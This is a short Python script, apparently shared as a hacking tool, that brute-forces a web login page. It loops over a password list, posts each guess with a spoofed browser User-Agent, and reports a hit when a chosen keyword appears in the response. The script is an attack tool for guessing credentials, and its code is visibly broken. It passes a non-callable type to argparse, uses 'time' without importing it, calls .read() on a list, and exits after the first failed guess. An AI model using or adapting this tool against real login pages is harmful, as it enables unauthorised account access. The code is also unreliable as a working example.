#!/usr/bin/python3

import argparse
import requests
import sys
from termcolor import colored

parser = argparse.ArgumentParser(prog="bruter", description="A Program That Bruteforces login pages")
parser.add_argument('-l', '--url', help="the login url")
parser.add_argument('-u', '--user', help="username")
parser.add_argument('-p', '--passwordList', help="a list of passwords", required=True)
parser.add_argument('-k', '--keyword', help="a specific keyword in the page source when you log in", type="string", required=True)
args = parser.parse_args()

print(colored("Only for Educational Purposes\n", "red"))
print(colored("LOGIN PAGE BRUTER BY @s3rd4r308\n", "green"))

url = args.url
username = args.user
pwList = args.passwordList
keyword = args.keyword

passwords = open(pwList, "r").readlines()

for i in passwords:
	password = i.strip()
	header = {"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0", "Content-Type" : "application/x-www-form-urlencoded", "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding" : "gzip, deflate, br", "Accept-Language" : "en-US,en;q=0.5"}
	cookie = {"PHPSESSID" : ""} #if the web server generates it for you (the parameter should be controlled)
	data = {"username" : username, "password" : password} #these username and password parameters should be controlled either because it can change server to server. there can be more than two parameters!!!
	start_time = time.time()
	r = requests.post(url, headers=header, cookies=cookie, data=data)
	if keyword in r.text:
		print(colored(f"[+] Password Found : {password}", "green"))
		print(colored("\nTime Elapsed: " + str(time.time()-start_time), "green"))
		data = passwords.read()
		words = data.split()
		print('List Count:', len(words))
	else:
		print(colored("[-] Could Not Found Any Valid Credential for {username}", "red"))
		print("\n[*] Exitting...")
		sys.exit()
